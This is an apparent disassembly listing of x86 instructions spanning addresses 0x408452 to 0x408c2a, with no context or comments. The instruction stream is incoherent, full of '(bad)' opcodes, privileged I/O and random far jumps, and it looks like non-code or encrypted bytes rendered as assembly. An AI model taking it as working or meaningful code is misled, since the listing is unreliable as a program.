  408452:	ds mov cl,BYTE PTR ds:0xa1cdf6ee
  40845a:	(bad)  
  40845b:	and    DWORD PTR [esi],edx
  40845d:	test   eax,0x4aa20a7c
  408462:	lock enter 0x2b88,0xe1
  408467:	sbb    ch,BYTE PTR [eax-0x43d8da96]
  40846d:	shr    eax,cl
  40846f:	adc    BYTE PTR [edx-0x5b],bl
  408472:	add    eax,0x1c052d5d
  408477:	pop    esi
  408478:	xlat   BYTE PTR ds:[ebx]
  408479:	test   al,0x89
  40847b:	mov    ds:0xdb300009,eax
  408480:	clc    
  408481:	(bad)
  408484:	adc    BYTE PTR [ebx+0x4b2b77c5],cl
  40848a:	(bad)  
  40848c:	inc    edx
  40848d:	sbb    ch,BYTE PTR [esi+ecx*8-0x58b03379]
  408494:	cmp    bh,BYTE PTR [eax]
  408496:	jnp    0x40842c
  408498:	and    eax,0x442720ab
  40849d:	xor    DWORD PTR [edx-0x6f],0xffffffa6
  4084a1:	test   DWORD PTR [ecx-0x7f],ebx
  4084a4:	cmc    
  4084a5:	and    cl,bh
  4084a7:	fisubr WORD PTR [edx-0x15]
  4084aa:	inc    esp
  4084ab:	jnp    0x408455
  4084ad:	lea    ebp,[eax-0x1ad79cbc]
  4084b3:	cdq    
  4084b4:	not    BYTE PTR [ecx]
  4084b6:	sbb    esi,DWORD PTR [edi-0x4de73b19]
  4084bc:	ds xchg dx,ax
  4084bf:	mov    dh,BYTE PTR [ebx-0x1b]
  4084c2:	fst    QWORD PTR [ecx+ebp*2]
  4084c5:	sbb    al,0x7
  4084c7:	dec    edx
  4084c8:	mov    al,BYTE PTR [esi]
  4084ca:	cdq    
  4084cb:	mov    eax,ds:0x6d0dcd30
  4084d0:	dec    edi
  4084d1:	add    al,ch
  4084d3:	fdivr  st(3),st
  4084d5:	cmp    BYTE PTR [esi],dl
  4084d7:	rol    DWORD PTR [eax-0x4b],1
  4084da:	xchg   edi,eax
  4084db:	lods   eax,DWORD PTR ds:[esi]
  4084dc:	inc    ebx
  4084dd:	push   es
  4084de:	dec    ecx
  4084df:	popa   
  4084e0:	inc    ecx
  4084e1:	dec    edx
  4084e2:	scas   eax,DWORD PTR es:[edi]
  4084e3:	inc    ebx
  4084e4:	loopne 0x4084ec
  4084e6:	fdiv   DWORD PTR [ebp+0x48]
  4084e9:	push   edi
  4084ea:	lds    eax,FWORD PTR [ecx-0x2b96bf1]
  4084f0:	jo     0x40848a
  4084f2:	inc    ebx
  4084f3:	dec    ebx
  4084f4:	leave  
  4084f5:	je     0x4084e4
  4084f7:	mov    eax,0xd8c9427f
  4084fc:	xchg   edi,eax
  4084fd:	cwde   
  4084fe:	push   es
  4084ff:	loopne 0x408485
  408501:	outs   dx,DWORD PTR ds:[esi]
  408502:	stos   DWORD PTR es:[edi],eax
  408503:	xlat   BYTE PTR ds:[ebx]
  408504:	push   0x68
  408506:	daa    
  408507:	jb     0x408501
  408509:	popa   
  40850a:	out    0x79,al
  40850c:	idiv   dh
  40850e:	jae    0x4084e7
  408510:	pop    ss
  408511:	js     0x4084a0
  408513:	sbb    al,BYTE PTR [eax+0x72]
  408516:	sbb    bl,BYTE PTR [esi+eax*1-0x3cb28c33]
  40851d:	loopne 0x408547
  40851f:	stos   BYTE PTR es:[edi],al
  408520:	adc    BYTE PTR [eax],dh
  408522:	jp     0x4084f9
  408524:	loope  0x408581
  408526:	lods   al,BYTE PTR ds:[esi]
  408527:	leave  
  408528:	mov    al,ds:0x4aefff07
  40852d:	mov    edx,0x8bad3b39
  408532:	xchg   edi,eax
  408533:	mov    ebx,0x4501c9d4
  408538:	(bad)  
  408539:	mov    WORD PTR [ebx-0x4a],?
  40853c:	test   DWORD PTR [ebp+0x70],ecx
  40853f:	dec    ebp
  408540:	jmp    0xecd36425
  408545:	xlat   BYTE PTR ds:[ebx]
  408546:	sub    BYTE PTR [eax+0x64],ch
  408549:	pop    esi
  40854a:	lea    esi,[ecx]
  40854c:	popa   
  40854d:	push   esp
  40854e:	mov    ch,0x84
  408550:	in     eax,0xa5
  408552:	rcr    dl,cl
  408554:	mov    bl,0x40
  408556:	rcr    BYTE PTR [eax-0x2d],1
  408559:	adc    DWORD PTR [edi],ebx
  40855b:	ror    BYTE PTR es:[eax-0x18],0x49
  408560:	push   cs
  408561:	iret   
  408562:	fstp   TBYTE PTR [esi-0x5e]
  408565:	add    bl,BYTE PTR [edx]
  408567:	push   ecx
  408568:	sbb    dl,BYTE PTR [eax]
  40856a:	xchg   ecx,eax
  40856b:	(bad)  
  40856c:	mov    bh,0x84
  40856f:	push   esp
  408570:	mov    DWORD PTR [esi-0x26],ecx
  408573:	cwde   
  408574:	out    dx,eax
  408575:	and    al,0xa9
  408577:	in     eax,dx
  408578:	and    al,0x21
  40857a:	xor    eax,0xe5878658
  40857f:	sub    eax,0x21a3e83f
  408584:	mov    eax,fs
  408586:	jb     0x40855e
  408588:	or     al,0x72
  40858a:	cmp    ebp,0x28
  40858d:	in     eax,0x17
  40858f:	test   DWORD PTR [esi],esi
  408591:	xor    DWORD PTR [esi+0x39],ebx
  408594:	jo     0x4085ff
  408596:	pop    ebp
  408597:	aam    0xf7
  408599:	aas    
  40859a:	test   eax,0xa3099dc
  40859f:	dec    esp
  4085a0:	shl    DWORD PTR [esi+0x536ee23a],1
  4085a6:	add    eax,0x55
  4085a9:	xchg   ebx,eax
  4085aa:	and    BYTE PTR [ecx],cl
  4085ac:	fnsave [eax]
  4085ae:	inc    edx
  4085af:	loop   0x4085ab
  4085b1:	sbb    ch,dl
  4085b3:	(bad)  
  4085b4:	and    al,BYTE PTR [edi]
  4085b6:	jne    0x40855d
  4085b8:	lods   al,BYTE PTR ds:[esi]
  4085b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085ba:	jecxz  0x408588
  4085bc:	dec    cl
  4085be:	daa    
  4085bf:	pusha  
  4085c0:	(bad)  
  4085c1:	sbb    esp,DWORD PTR [esi]
  4085c3:	and    ah,BYTE PTR [esi+0x67d75a9a]
  4085c9:	jnp    0x40857a
  4085cb:	mov    al,ds:0x90e91209
  4085d0:	xor    DWORD PTR [eax],0x986c75f4
  4085d6:	in     eax,dx
  4085d7:	xlat   BYTE PTR ds:[ebx]
  4085d8:	sub    BYTE PTR ds:0x60630f07,al
  4085de:	push   es
  4085df:	push   cs
  4085e0:	add    eax,0xfee81406
  4085e5:	and    eax,0xcf32132d
  4085ea:	pop    edi
  4085eb:	pop    ds
  4085ec:	and    eax,0x74c517a3
  4085f1:	test   eax,edx
  4085f3:	adc    ch,cl
  4085f5:	cmc    
  4085f6:	jne    0x4085d3
  4085f8:	or     dl,BYTE PTR [ecx+0x67]
  4085fb:	jne    0x4085ae
  4085fd:	mov    ds,WORD PTR [edi-0xa]
  408600:	sbb    eax,0x534696e7
  408605:	inc    edx
  408606:	retf   0xd5fd
  408609:	test   esp,ebp
  40860b:	cli    
  40860c:	popf   
  40860d:	(bad)  
  40860e:	mov    ds:0xd4ce305f,al
  408613:	enter  0xbf25,0x2c
  408617:	test   ah,ch
  408619:	mov    esi,0x8ec7bb1d
  40861e:	xchg   ebp,eax
  40861f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408620:	adc    al,0x9c
  408622:	nop
  408623:	icebp  
  408624:	pop    ds
  408625:	clc    
  408626:	adc    ah,BYTE PTR [esi-0x1d]
  408629:	jne    0x40867b
  40862b:	bswap  edx
  40862d:	test   DWORD PTR [ecx],0x44229a5e
  408633:	inc    ecx
  408634:	(bad)  
  408635:	jb     0x4086b6
  408637:	into   
  408638:	add    al,0x87
  40863b:	push   cs
  40863c:	cli    
  40863d:	cwde   
  40863e:	iret   
  40863f:	std    
  408640:	popa   
  408641:	(bad)  
  408642:	stc    
  408643:	mov    ebp,0x7b3934de
  408648:	cmp    DWORD PTR [eax],ecx
  40864a:	lock jae 0x4085ff
  40864d:	push   cs
  40864e:	mov    ds:0xb130e5d1,eax
  408653:	push   ecx
  408654:	mov    DWORD PTR [ebx],esi
  408656:	jae    0x408682
  408658:	(bad)  
  408659:	inc    ebx
  40865a:	xchg   DWORD PTR [eax+0x3b],edx
  40865d:	push   0xe
  40865f:	das    
  408660:	cmp    BYTE PTR [eax-0x53],bl
  408663:	les    esp,FWORD PTR [edi]
  408665:	mov    ch,0xa8
  408667:	neg    DWORD PTR [ebx+ebx*2-0x2e]
  40866b:	les    eax,FWORD PTR [eax]
  40866d:	push   ss
  40866e:	(bad)  
  40866f:	test   al,0xab
  408671:	(bad)  
  408672:	sub    eax,0xc82b98f8
  408677:	je     0x408692
  408679:	popf   
  40867a:	inc    esi
  40867b:	jns    0x40861a
  40867d:	sub    BYTE PTR [edi+0x2492b996],dh
  408683:	(bad)  
  408684:	and    eax,0x844035b4
  408689:	lods   al,BYTE PTR ds:[esi]
  40868a:	pop    ebp
  40868b:	sub    BYTE PTR [ebx],bh
  40868d:	mov    bh,0xb7
  40868f:	ret    0x7218
  408692:	ror    DWORD PTR [ecx+ebp*2],1
  408695:	push   esi
  408696:	sbb    ebx,DWORD PTR [ecx+0x31deede7]
  40869c:	or     BYTE PTR [edi],dl
  40869e:	and    ah,BYTE PTR [ecx+0x274242f4]
  4086a4:	push   cs
  4086a5:	fcom   QWORD PTR [edi-0x80b45e7]
  4086ab:	(bad)  
  4086ac:	push   esi
  4086ad:	fwait
  4086ae:	push   ds
  4086af:	aaa    
  4086b0:	aaa    
  4086b1:	test   eax,0x283f0cf3
  4086b6:	adc    al,0x56
  4086b8:	retf   0x17bf
  4086bb:	mov    ebp,0x614b837a
  4086c0:	cmp    DWORD PTR [ebp-0x1c42d843],0xffffffe7
  4086c7:	pop    ss
  4086c8:	adc    eax,0x6afbba2
  4086cd:	int3   
  4086ce:	sub    DWORD PTR [eax-0x46],edi
  4086d1:	or     esp,DWORD PTR [ebx]
  4086d3:	cmp    cl,cl
  4086d5:	fcomp  QWORD PTR [edx+edx*2-0x63151c51]
  4086dc:	dec    ebp
  4086dd:	mov    eax,ds:0x371a95ff
  4086e2:	sbb    eax,0x6c683b9a
  4086e7:	pop    esi
  4086e8:	leave  
  4086e9:	rol    BYTE PTR [eax-0x20],1
  4086ec:	stc    
  4086ed:	cld    
  4086ee:	add    eax,0xb4dac2e7
  4086f3:	push   ss
  4086f4:	(bad)  
  4086f5:	or     ebx,DWORD PTR [eax-0x1e465233]
  4086fb:	cmp    DWORD PTR [ecx-0x7],0xe6fff0f3
  408702:	adc    DWORD PTR ds:0x50268bcc,esp
  408708:	add    eax,0xd3c756fa
  40870d:	mov    ds:0x80ed4c8a,al
  408712:	mov    dl,0xa7
  408714:	mov    esp,0x217e3f53
  408719:	jb     0x40871b
  40871b:	cmp    DWORD PTR [ebx],ebx
  40871d:	das    
  40871e:	sbb    cl,BYTE PTR [eax]
  408720:	je     0x4086ef
  408722:	ror    bl,cl
  408724:	push   0x25
  408726:	bound  ecx,QWORD PTR [eax]
  408728:	mov    esp,0x5b36ffae
  40872d:	mov    ah,0xa9
  40872f:	cmp    ch,bh
  408731:	hlt    
  408732:	lock stos BYTE PTR es:[edi],al
  408734:	idiv   BYTE PTR [eax-0x2985ab7b]
  40873a:	inc    esi
  40873b:	sub    al,0x10
  40873d:	or     BYTE PTR [edi],bl
  40873f:	in     al,dx
  408740:	jno    0x40878c
  408742:	daa    
  408743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408744:	inc    ecx
  408745:	sub    eax,0x9a597aad
  40874a:	push   ecx
  40874b:	lahf   
  40874c:	dec    esi
  40874d:	dec    ecx
  40874e:	es mov esp,0xe958c7cd
  408754:	push   ebx
  408755:	call   0x7263:0x5a437c38
  40875c:	jnp    0x408734
  40875e:	sbb    ah,BYTE PTR [esi]
  408760:	cmp    BYTE PTR [ebp+0x1],al
  408763:	add    BYTE PTR [edx-0x25ec5170],bh
  408769:	sbb    ecx,DWORD PTR [esi+esi*4-0x4bae97f1]
  408770:	jbe    0x408778
  408772:	inc    eax
  408773:	js     0x408727
  408775:	cmc    
  408776:	mul    BYTE PTR [edx+ebx*1-0x4d]
  40877a:	fldpi  
  40877c:	inc    edx
  40877d:	iret   
  40877e:	mov    eax,ds:0xde1f2c94
  408783:	or     ecx,DWORD PTR [ecx+0x78ada084]
  408789:	adc    BYTE PTR [esi-0x6cff5deb],bh
  40878f:	jmp    0x56a1:0xe3938a4c
  408796:	push   0xf396838f
  40879b:	cmp    dh,bl
  40879d:	inc    edx
  40879e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40879f:	sbb    al,BYTE PTR [edi+0x75]
  4087a2:	das    
  4087a3:	cmp    al,0xc
  4087a5:	mov    eax,0x61c6a642
  4087aa:	aas    
  4087ab:	mov    ebx,0x1fba0416
  4087b0:	jbe    0x40879b
  4087b2:	int    0x59
  4087b4:	cwde   
  4087b5:	lahf   
  4087b6:	lahf   
  4087b7:	sub    BYTE PTR [eax],dh
  4087b9:	mov    eax,ds:0x2f12e002
  4087be:	push   cs
  4087bf:	out    dx,ax
  4087c1:	mov    dh,0xb3
  4087c3:	iret   
  4087c4:	adc    al,0x84
  4087c6:	and    eax,0xa282d277
  4087cb:	scas   al,BYTE PTR es:[edi]
  4087cc:	pop    ebx
  4087cd:	lds    esp,FWORD PTR [ebp-0x76b82b37]
  4087d3:	lahf   
  4087d4:	and    eax,0x9869b8b6
  4087d9:	fs ds (bad) 
  4087dc:	fwait
  4087dd:	das    
  4087de:	mov    al,0x84
  4087e0:	imul   DWORD PTR [edx+eax*1-0x308477c2]
  4087e7:	int3   
  4087e8:	mov    cl,0x81
  4087ea:	popa   
  4087eb:	scas   eax,DWORD PTR es:[edi]
  4087ec:	xchg   ebx,eax
  4087ed:	int    0x5e
  4087ef:	cmp    DWORD PTR [edi-0x17],ebx
  4087f2:	adc    DWORD PTR [esi+esi*2],esi
  4087f5:	enter  0xa398,0x33
  4087f9:	pop    esp
  4087fa:	ficom  WORD PTR [ecx+0x7a]
  4087fd:	stos   BYTE PTR es:[edi],al
  4087fe:	add    eax,0xf96f5071
  408803:	mov    esi,0x2c829e31
  408808:	cmp    ecx,DWORD PTR [edx]
  40880a:	mov    ds:0x4bf2d9b6,al
  40880f:	fsub   DWORD PTR [esi]
  408811:	into   
  408812:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408813:	sbb    eax,0x7186dcd5
  408818:	push   ebx
  408819:	sbb    DWORD PTR ds:[eax-0x41],ecx
  40881d:	sbb    al,0xa1
  40881f:	add    eax,0x393b2fcc
  408824:	(bad)  
  408825:	lods   al,BYTE PTR ds:[esi]
  408826:	pop    esp
  408827:	xchg   ebx,eax
  408828:	jp     0x408814
  40882a:	(bad)  
  40882b:	push   edx
  40882c:	xor    eax,0x1b3a37c3
  408831:	pop    ecx
  408832:	push   esi
  408833:	lea    edx,[edx-0x6f]
  408836:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408837:	sahf   
  408838:	and    DWORD PTR [edx],0x49
  40883b:	or     BYTE PTR [si+0x11],ah
  40883f:	mov    ebx,0x21d6b6ee
  408844:	xchg   DWORD PTR ds:0x2306d7f8,ebx
  40884a:	xor    eax,DWORD PTR [ecx-0x9]
  40884d:	or     DWORD PTR [edi+ebp*4],esi
  408850:	fist   WORD PTR [esi+ecx*2]
  408853:	inc    esp
  408854:	ret    
  408855:	mov    WORD PTR ds:[eax+esi*2],ds
  408859:	push   es
  40885a:	(bad)  
  40885b:	stos   DWORD PTR es:[edi],eax
  40885c:	xchg   ebp,eax
  40885d:	cmp    BYTE PTR [ebx+eax*2],0x34
  408861:	jno    0x4088a0
  408863:	mov    ds:0x3911a332,al
  408868:	pushf  
  408869:	pop    ebx
  40886a:	fldcw  WORD PTR [ebx+ebp*2-0x2ed04f61]
  408871:	and    ah,bh
  408873:	mov    dl,0x81
  408875:	xchg   esp,eax
  408876:	fidiv  WORD PTR [eax-0x62]
  408879:	imul   al
  40887b:	jno    0x40885c
  40887d:	mov    edi,0x39e0884f
  408882:	mov    ebp,esp
  408884:	test   dl,ah
  408886:	push   DWORD PTR [eax-0x73]
  408889:	hlt    
  40888a:	fwait
  40888b:	push   ecx
  40888c:	sbb    al,0x2d
  40888e:	inc    ecx
  40888f:	or     ch,dh
  408891:	cmp    al,0x14
  408893:	(bad)  
  408894:	fadd   QWORD PTR [esi+0x6e]
  408897:	fimul  DWORD PTR [ebx]
  408899:	push   es
  40889a:	jmp    0xc28e:0xe84032b9
  4088a1:	and    DWORD PTR [edx-0x75],0x46
  4088a5:	(bad)  
  4088a6:	cmp    BYTE PTR [eax+0x14],ch
  4088a9:	or     DWORD PTR cs:[ecx+0x6b903fb0],ebx
  4088b0:	add    al,0x27
  4088b2:	jl     0x408893
  4088b4:	sar    BYTE PTR [eax-0x2cbfcbd3],1
  4088ba:	mov    ebp,0x7683abeb
  4088bf:	outs   dx,BYTE PTR ds:[esi]
  4088c0:	mov    WORD PTR [edx-0x79],es
  4088c3:	mov    ch,0xef
  4088c5:	mov    ds:0x656e3a04,al
  4088ca:	push   0x66
  4088cc:	mov    WORD PTR [edi+0x443c7da9],?
  4088d2:	push   eax
  4088d3:	mov    ?,WORD PTR [ecx]
  4088d5:	mov    cl,0x67
  4088d7:	mov    esp,0x6fee4923
  4088dc:	ss push esp
  4088de:	cmp    DWORD PTR [esi+0x12],ebx
  4088e1:	iret   
  4088e2:	icebp  
  4088e3:	or     ebp,eax
  4088e5:	fisubr WORD PTR [ebp+0xb]
  4088e8:	xchg   DWORD PTR [ebx-0xf],ecx
  4088eb:	sbb    ah,ch
  4088ed:	fs push 0x24ad8250
  4088f3:	data16 inc BYTE PTR [ecx+0x79]
  4088f7:	adc    bl,bh
  4088f9:	test   eax,0xc18d0a1d
  4088fe:	outs   dx,BYTE PTR ds:[esi]
  4088ff:	add    ch,bl
  408901:	adc    esi,esi
  408903:	leave  
  408904:	in     eax,dx
  408905:	mov    edi,0x6502e6e6
  40890a:	daa    
  40890b:	inc    ecx
  40890c:	push   ss
  40890d:	out    0x4a,al
  40890f:	push   esp
  408910:	stc    
  408911:	stc    
  408912:	rol    WORD PTR [ecx-0x58493e3b],1
  408919:	inc    edx
  40891a:	shl    BYTE PTR [edi+0x2f864aaf],0x4e
  408921:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408922:	adc    al,0xbe
  408924:	cmp    al,0x42
  408926:	in     al,0xa1
  408928:	mov    ecx,0xee84d7f4
  40892d:	scas   al,BYTE PTR es:[edi]
  40892e:	out    dx,al
  40892f:	repnz and edi,DWORD PTR ds:0x45247831
  408936:	das    
  408937:	pop    eax
  408938:	iret   
  408939:	cmp    DWORD PTR [ecx],0x73c68a27
  40893f:	and    dl,BYTE PTR cs:[ebp+0x67]
  408943:	push   ecx
  408944:	sbb    ah,ah
  408946:	stos   BYTE PTR es:[edi],al
  408947:	pop    esp
  408948:	int3   
  408949:	lahf   
  40894a:	jmp    0xcc48346
  40894f:	jmp    0x4088dd
  408951:	enter  0x820f,0x18
  408955:	push   eax
  408956:	inc    ecx
  408957:	dec    esp
  408958:	jg     0x408935
  40895a:	xchg   ebx,eax
  40895b:	sti    
  40895c:	mov    ebp,0x19725c62
  408961:	cmp    al,0x93
  408963:	cdq    
  408964:	mov    ds:0x8bca7964,al
  408969:	cmc    
  40896a:	pop    ds
  40896b:	inc    esp
  40896c:	lock aas 
  40896e:	das    
  40896f:	push   ds
  408970:	arpl   WORD PTR [eax-0x7f],ax
  408973:	mov    al,0xd7
  408975:	jne    0x408978
  408977:	scas   al,BYTE PTR es:[edi]
  408978:	push   ebx
  408979:	pusha  
  40897a:	je     0x408939
  40897c:	je     0x408901
  40897e:	cli    
  40897f:	xor    BYTE PTR [ecx-0x4d],dl
  408982:	(bad)  
  408983:	in     eax,dx
  408984:	pop    ebp
  408985:	sub    BYTE PTR [edx-0x61],0x1a
  408989:	push   es
  40898a:	call   DWORD PTR [edx+0x26]
  40898d:	mov    ds:0xd2feb0b8,al
  408992:	and    DWORD PTR [ebp-0x7c],esi
  408995:	ja     0x408a14
  408997:	jg     0x408992
  408999:	mov    ebx,0x10857b5c
  40899e:	adc    DWORD PTR ds:0xb69da17c,esp
  4089a4:	cmp    BYTE PTR [ebp-0x4],0xea
  4089a8:	scas   al,BYTE PTR es:[edi]
  4089a9:	mov    ah,0x27
  4089ab:	or     eax,0xc93efef9
  4089b0:	add    eax,0xdd2ae0a2
  4089b5:	dec    eax
  4089b6:	pop    esi
  4089b7:	inc    ebx
  4089b8:	and    ecx,DWORD PTR [ecx]
  4089ba:	call   0x8da8:0x141343b8
  4089c1:	jo     0x408a28
  4089c3:	mov    ecx,0x235a3e3d
  4089c8:	mov    al,ds:0x7a0c9374
  4089cd:	loope  0x408a41
  4089cf:	in     eax,dx
  4089d0:	mov    dl,0xd6
  4089d2:	sar    BYTE PTR [ecx],0x60
  4089d5:	or     eax,0x64fe376d
  4089da:	mov    edi,DWORD PTR [esp-0x53]
  4089de:	push   esi
  4089df:	pop    edi
  4089e0:	vpsrad ymm2,ymm5,XMMWORD PTR [ebp+0x35]
  4089e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089e6:	mov    ecx,0x548d2ffa
  4089eb:	cmp    bl,BYTE PTR [ecx]
  4089ed:	mov    edi,0x8631a84d
  4089f2:	cmp    al,0x6b
  4089f4:	out    0xb,al
  4089f6:	aas    
  4089f7:	push   cs
  4089f8:	sub    eax,0xd41f595b
  4089fd:	and    DWORD PTR [esi-0x1d],edi
  408a00:	push   esp
  408a01:	adc    eax,0xaa34a2af
  408a06:	pop    esi
  408a07:	div    ah
  408a09:	imul   eax,DWORD PTR [ecx],0xa
  408a0c:	adc    al,0xc
  408a0e:	sub    bl,dl
  408a10:	xchg   esi,eax
  408a11:	xchg   ecx,eax
  408a12:	stc    
  408a13:	shl    DWORD PTR ds:0x8dba9676,1
  408a19:	add    DWORD PTR [eax-0x7f],edx
  408a1c:	hlt    
  408a1d:	push   ebp
  408a1e:	xor    eax,0x70c8fe17
  408a23:	sub    al,BYTE PTR [edi]
  408a25:	ja     0x408a0e
  408a27:	outs   dx,DWORD PTR ds:[esi]
  408a28:	lock mov di,0x2505
  408a2d:	sub    DWORD PTR [ebx-0x669f666d],ebx
  408a33:	cld    
  408a34:	test   al,0x64
  408a36:	and    al,0xe7
  408a38:	and    al,0x61
  408a3a:	fwait
  408a3b:	test   eax,0xbcc01904
  408a40:	mov    esi,0x4f94c30e
  408a45:	jecxz  0x408a8a
  408a47:	jl     0x4089e8
  408a49:	fist   WORD PTR [eax]
  408a4b:	mov    bh,0x22
  408a4d:	adc    ebx,DWORD PTR [edx]
  408a4f:	out    0x5b,al
  408a51:	call   0x206263a1
  408a56:	and    DWORD PTR [ecx+0x352bf8f6],ebp
  408a5c:	adc    eax,0xf7a8366
  408a61:	pop    ds
  408a62:	cld    
  408a63:	push   ds
  408a64:	das    
  408a65:	dec    edi
  408a66:	push   cs
  408a67:	pop    ebx
  408a68:	stos   DWORD PTR es:[edi],eax
  408a69:	pop    DWORD PTR [ebx-0x41]
  408a6c:	jne    0x408a3e
  408a6e:	xor    al,0x9c
  408a70:	xchg   DWORD PTR [ecx+0x34],ebp
  408a73:	and    ecx,esi
  408a75:	sbb    al,0x7d
  408a77:	out    dx,eax
  408a78:	icebp  
  408a79:	jbe    0x408a17
  408a7b:	test   ah,bh
  408a7d:	in     eax,dx
  408a7e:	sub    DWORD PTR [esi+0x6bec1220],0xffffff96
  408a85:	jecxz  0x408a59
  408a87:	pushf  
  408a88:	sbb    eax,0xe5efdec4
  408a8d:	mov    ah,0x99
  408a8f:	push   ds
  408a90:	xor    al,0x3a
  408a92:	jb     0x408aea
  408a94:	stos   BYTE PTR es:[edi],al
  408a95:	push   es
  408a96:	adc    ah,BYTE PTR [ebx+edi*1]
  408a99:	xor    BYTE PTR [ebx-0x5c],0xb2
  408a9d:	mov    al,ds:0xeb5cb760
  408aa2:	cld    
  408aa3:	mov    bh,0x93
  408aa5:	xor    BYTE PTR [ebx+esi*2-0x7956780a],dh
  408aac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408aad:	dec    eax
  408aae:	xlat   BYTE PTR ds:[ebx]
  408aaf:	ins    BYTE PTR es:[edi],dx
  408ab0:	in     eax,dx
  408ab1:	dec    esp
  408ab2:	adc    al,0xe4
  408ab4:	rol    DWORD PTR [esi-0x31],1
  408ab7:	inc    ecx
  408ab8:	xor    DWORD PTR [edi],edi
  408aba:	loope  0x408aee
  408abc:	sub    cl,al
  408abe:	scas   al,BYTE PTR es:[edi]
  408abf:	scas   al,BYTE PTR es:[edi]
  408ac0:	sbb    DWORD PTR [eax+0x36],esi
  408ac3:	mov    edx,0x7384a74d
  408ac8:	enter  0x58cf,0x95
  408acc:	inc    eax
  408acd:	sbb    DWORD PTR [ecx+edi*1],edx
  408ad0:	mov    eax,ds:0xb189e309
  408ad5:	aas    
  408ad6:	jns    0x408b09
  408ad8:	add    DWORD PTR [ebx-0x67ce5fc3],ecx
  408ade:	xchg   ecx,eax
  408adf:	sbb    ecx,edx
  408ae1:	xchg   edi,eax
  408ae2:	sub    eax,0xc64e86b5
  408ae7:	push   esp
  408ae8:	cmp    BYTE PTR [eax-0x12],dh
  408aeb:	ret    0x493f
  408aee:	fdiv   DWORD PTR [ecx]
  408af0:	xor    BYTE PTR [ecx+0x2a],dh
  408af3:	out    0x9b,eax
  408af5:	inc    ecx
  408af6:	xchg   esp,eax
  408af7:	inc    eax
  408af8:	jae    0x408b1a
  408afa:	jmp    0x71d13d89
  408aff:	cld    
  408b00:	jmp    0x7d5e5221
  408b05:	outs   dx,DWORD PTR ds:[esi]
  408b06:	dec    ebp
  408b07:	mov    eax,0x13519a9d
  408b0c:	xor    edx,DWORD PTR [ebx+0x17013e06]
  408b12:	shr    DWORD PTR ds:[ebp-0x11],1
  408b16:	push   0x153f73bb
  408b1b:	sub    DWORD PTR [ebp+0x4bb8cb6c],esp
  408b21:	sbb    ah,ch
  408b23:	sub    bl,BYTE PTR [eax]
  408b25:	mov    eax,0xb82bcf87
  408b2a:	or     DWORD PTR [edi],ebp
  408b2c:	loop   0x408ae3
  408b2e:	ftst   
  408b30:	xchg   edx,eax
  408b31:	pop    ebx
  408b32:	mov    esi,0x178f878c
  408b37:	dec    eax
  408b38:	mov    bh,0x7
  408b3a:	xchg   esp,eax
  408b3b:	mov    DWORD PTR [ebp-0x4e],ebp
  408b3e:	(bad)  
  408b3f:	sti    
  408b40:	mov    ebx,0x437254fb
  408b45:	add    bh,ah
  408b47:	jae    0x408b8a
  408b49:	xor    al,0xcd
  408b4b:	jge    0x408bb4
  408b4d:	push   edx
  408b4e:	mov    ah,0x7b
  408b50:	and    al,0x66
  408b52:	push   ecx
  408b53:	adc    ch,BYTE PTR [ebp-0x13]
  408b56:	push   edi
  408b57:	lock xchg ebx,eax
  408b59:	arpl   WORD PTR [esp+ebx*2-0x50],sp
  408b5d:	std    
  408b5e:	and    eax,0x7047aa50
  408b63:	or     BYTE PTR [esi+0x66],al
  408b66:	sbb    dl,BYTE PTR [edi-0x45]
  408b69:	cs jo  0x408bc3
  408b6c:	mov    ebx,0xaac100bc
  408b71:	mov    ebp,0xf35ee795
  408b76:	xchg   edx,eax
  408b77:	mov    ds:0x3b4ad782,eax
  408b7c:	cmp    ebx,DWORD PTR [ebx+0x28]
  408b7f:	and    al,0x50
  408b81:	push   ebp
  408b82:	imul   ecx,DWORD PTR [ebx-0xb4f637e],0xc3f206d0
  408b8c:	xchg   DWORD PTR [edx+0x3e4f48b6],eax
  408b92:	sbb    eax,0x46dee7b8
  408b97:	dec    esp
  408b98:	or     BYTE PTR [edx-0x52341196],0x19
  408b9f:	call   0x7223cb54
  408ba4:	or     DWORD PTR [ebx],ebp
  408ba6:	pop    esi
  408ba7:	test   esp,ebp
  408ba9:	cmp    eax,0x75360b77
  408bae:	or     al,0x19
  408bb0:	jnp    0x408c0d
  408bb2:	add    bh,BYTE PTR [esi+0x3102f140]
  408bb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bb9:	fs ds adc esp,eax
  408bbd:	je     0x408c01
  408bbf:	inc    edi
  408bc0:	xlat   BYTE PTR ds:[ebx]
  408bc1:	mov    eax,0x17af6f8a
  408bc6:	shl    DWORD PTR [edi-0x74],0x36
  408bca:	cmp    al,0x5c
  408bcc:	cs push es
  408bce:	imul   edx,DWORD PTR [esi+0x3308962d],0x4c1fa87f
  408bd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bd9:	pushf  
  408bda:	adc    dh,BYTE PTR [ebx+eiz*2+0x15]
  408bde:	das    
  408bdf:	mov    edx,0x9adb3f9f
  408be4:	push   eax
  408be5:	cmp    DWORD PTR [edx+0x6b94410b],esp
  408beb:	sbb    eax,0xb1ba7958
  408bf0:	(bad)  
  408bf1:	ds dec esi
  408bf3:	dec    esp
  408bf4:	xchg   edi,eax
  408bf5:	ins    BYTE PTR es:[edi],dx
  408bf6:	inc    esi
  408bf7:	cmp    al,0xe9
  408bf9:	pop    ecx
  408bfa:	lock test al,0x21
  408bfd:	cmp    cl,BYTE PTR [edx-0x22]
  408c00:	hlt    
  408c01:	mov    ebp,ecx
  408c03:	arpl   WORD PTR [ebp+0x14548003],bx
  408c09:	add    DWORD PTR ds:0xbb8a59af,edx
  408c0f:	mov    eax,0x8ce9176c
  408c14:	sub    al,0xb2
  408c16:	pop    esp
  408c17:	sar    BYTE PTR [ecx+edx*2+0x65d2de75],0xa2
  408c1f:	or     BYTE PTR [ecx+0x64],0x2f
  408c23:	je     0x408c92
  408c25:	in     al,dx
  408c26:	into   
  408c27:	fs inc edi
  408c29:	sti    
  408c2a:	in     al,0xe
